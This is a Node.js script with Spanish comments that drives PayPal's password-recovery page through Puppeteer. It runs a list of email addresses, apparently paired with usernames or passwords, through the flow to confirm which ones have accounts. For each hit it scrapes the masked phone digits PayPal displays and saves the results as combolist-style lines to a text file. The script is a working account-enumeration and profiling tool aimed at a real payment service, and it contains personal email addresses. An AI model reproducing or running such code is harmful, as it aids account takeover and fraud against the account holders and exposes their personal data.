//Exportaciones
const express = require("express");
const puppeteer = require("puppeteer");
const fs = require("fs");
const app = express();
const PORT = 3000;

// Input email
const emailClass =
  ".css-fmoxik-text_input_control-text_body-label_placeholder_shown_and_not_focused-text_body";

// Btn next
const nextButtonSelector = "#pwrStartPageSubmit";

// Input del span Phone
const phoneNumberClass = ".challengeOptionLabel.css-ocx2w6-text_body";

// Lista de correos
let correos = [
  { correo: "sparta98.me@gmail.com", user: "This_i$$parta33333" },
  { correo: "camicarva119@gmail.com", user: "Thi" },
  { correo: "santicardona777@gmail.com", user: "sebna" },
];

let data = [];

app.get("/scraper", async (req, res) => {
  try {
    console.log("\nInicio del scraping...\n");
    //vueltas por cada email
    for (let i = 0; i < correos.length; i++) {
      const email = correos[i].correo;

      console.log(`\nProcesando correo: ${email}`);

      //Inicio del scraper
      const browser = await puppeteer.launch();
      const page = await browser.newPage();

      //Pagina de recolecta de datos
      await page.goto(
        "https://www.paypal.com/authflow/password-recovery/?country.x=US&locale.x=en_US&redirectUri=%252Fsignin"
      );

      // Espera a que se cargue el campo de entrada del correo electrónico
      await page.waitForSelector(emailClass);

      // Ingresa el correo electrónico el script
      await page.$eval(
        emailClass,
        (element, email) => (element.value = email),
        email
      );

      // Captura el valor actual del campo de correo electrónico
      const emailFieldValue = await page.$eval(
        emailClass,
        (element) => element.value
      );

      // Verifica si el correo electrónico se ha establecido correctamente
      if (emailFieldValue === email) {
        console.log(
          "El correo electrónico se ha ingresado correctamente:",
          email
        );

        await page.click(nextButtonSelector);

        // Espera a que se cargue el div que contiene el número de teléfono
        try {
          await Promise.race([
            page.waitForSelector(phoneNumberClass),
            new Promise((resolve) => setTimeout(resolve, 30000)), // Espera máximo 30 segundos
          ]);
        } catch (error) {
          console.log(
            "El selector no se encontró dentro del tiempo especificado"
          );
        }

        // Captura el valor del número de teléfono si está disponible
        let phoneNumber = null;
        try {
          phoneNumber = await page.$eval(phoneNumberClass, (element) => {
            const span = element.querySelector("span");
            return span ? span.innerText : null;
          });
        } catch (error) {
          console.log("No se pudo capturar el número de teléfono");
        }

        // Captura los últimos 4 dígitos del número de teléfono
        const lastFourDigits = phoneNumber ? phoneNumber.slice(-5) : null;

        // Validando que el phone no sea nulo
        if (lastFourDigits == null) {
          console.log(`${emailFieldValue} no existe\n`);
        } else {
          //Formateando la informacion
          const formattedInfo = `${emailFieldValue}:${correos[i].user} | PHONE = ${lastFourDigits} |`;
          //Agg el formato al array de data
          data.push(formattedInfo);
          console.log(`${formattedInfo}\n`);
        }
      } else {
        console.log(
          "Error: El correo electrónico no se ha ingresado correctamente\n"
        );
      }

      await browser.close();
    }

    console.log("Fin del scraping");

    //retorno de los scraping completados
    function finishScraping() {
      console.log("\n*************************************************");
      data.forEach((e) => {
        console.log(e);
      });
      console.log("\n*************************************************");
    }
    finishScraping();

    // Contenido del archivo de texto
    let contenido = "";

    data.forEach((e) => {
      contenido += e + "\n";
    });

    // Ruta y nombre del archivo de texto
    const rutaArchivo = "scraper.txt";

    fs.writeFile(rutaArchivo, contenido, (error) => {
      if (error) {
        console.error("Error al escribir el archivo:", error);
      } else {
        console.log("Archivo de texto creado exitosamente.");
      }
    });

    res.send("Scrping finalizado, archivo txt creado exitosamente");
  } catch (error) {
    console.error("Error al capturar datos:", error);
    res.status(500).send("Error al capturar datos");
  }
});

app.listen(PORT, () => {
  console.log(`Servidor Express en ejecución en el puerto ${PORT}`);
});
